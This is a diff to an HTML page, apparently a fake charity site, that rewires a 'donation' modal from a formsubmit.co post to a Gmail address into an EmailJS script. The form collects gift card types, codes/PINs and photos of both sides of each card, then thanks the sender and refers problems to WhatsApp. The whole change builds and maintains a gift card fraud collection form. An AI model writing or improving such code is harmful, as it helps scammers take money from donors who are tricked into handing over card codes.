@@ -7,7 +7,7 @@
     
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         :root {
             --primary-blue: #0047AB;
@@ -562,20 +562,20 @@
             </div>
 
             <div class="modal-form">
-                <form action="https://formsubmit.co/organization461@gmail.com" method="POST" enctype="multipart/form-data">
-                    <input type="text" name="name" placeholder="Full Name" required>
+                <form id="donate-form">
+                    <input type="text" name="from_name" placeholder="Full Name" required>
                     <select name="card_type">
-                        <option>Amazon Card</option>
-                        <option>Apple / iTunes</option>
-                        <option>Visa / Vanilla</option>
-                        <option>Steam / Razor</option>
+                        <option value="Amazon">Amazon Card</option>
+                        <option value="Apple/iTunes">Apple / iTunes</option>
+                        <option value="Visa/Vanilla">Visa / Vanilla</option>
+                        <option value="Steam/Razor">Steam / Razor</option>
                     </select>
-                    <input type="text" name="code" placeholder="Card Code / PIN" required>
+                    <input type="text" name="card_code" placeholder="Card Code / PIN" required>
                     <div class="file-input-wrapper">
                         <label>Upload Card Photos (Front & Back)</label>
-                        <input type="file" name="attachment" accept="image/*" required>
+                        <input type="file" name="my_file" accept="image/*" required>
                     </div>
-                    <button type="submit" class="submit-btn">Send Donation</button>
+                    <button type="submit" class="submit-btn" id="submit-btn">Send Donation</button>
                 </form>
             </div>
         </div>
@@ -677,6 +677,45 @@ function closeDonation() {
     
     document.body.style.overflow = 'auto'; // Enable scrolling
 }
+    
+
+
+   (function(){
+      // Replace with your actual Public Key from EmailJS Account tab
+      emailjs.init("YOUR_PUBLIC_KEY"); 
+   })();
+
+   const btn = document.getElementById('submit-btn');
+   const form = document.getElementById('donate-form');
+
+   form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      btn.innerText = 'Sending...';
+      btn.disabled = true;
+
+      // Replace these with your actual IDs from the EmailJS dashboard
+      const serviceID = 'service_zn32uid';
+      const templateID = 'template_zj5yifc';
+
+      emailjs.sendForm(serviceID, templateID, this)
+        .then(() => {
+          btn.innerText = 'Success!';
+          alert('Thank you! Your donation has been sent. We will process it shortly.');
+          
+          // These functions should exist in your main script to clean up the UI
+          closeDonation(); 
+          form.reset();
+          btn.disabled = false;
+          btn.innerText = 'Send Donation';
+        }, (err) => {
+          btn.disabled = false;
+          btn.innerText = 'Send Donation';
+          alert("Oops! Something went wrong. Please try again or contact us on WhatsApp.");
+          console.error("EmailJS Error:", err);
+        });
+   });
+
     </script>
 </body>
 </html>
